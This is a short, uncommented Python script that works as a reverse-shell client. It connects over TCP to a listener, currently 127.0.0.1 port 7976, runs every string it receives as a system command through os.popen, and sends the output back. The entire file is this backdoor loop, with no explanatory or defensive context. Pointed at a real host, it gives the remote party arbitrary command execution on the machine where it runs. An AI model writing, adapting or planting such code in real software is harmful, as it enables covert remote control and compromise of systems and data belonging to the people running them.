import socket, threading, os

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('127.0.0.1', 7976))

def send(msg):
    client.send(msg.encode('ascii'))
def receive():
    while True:
        try:
            message = client.recv(1024).decode('ascii')
            output = os.popen(message).read()
            client.send(output.encode('ascii'))
                
        except:
            print("An error occured!")
            client.close()
            break

receive_thread = threading.Thread(target=receive)
receive_thread.start()
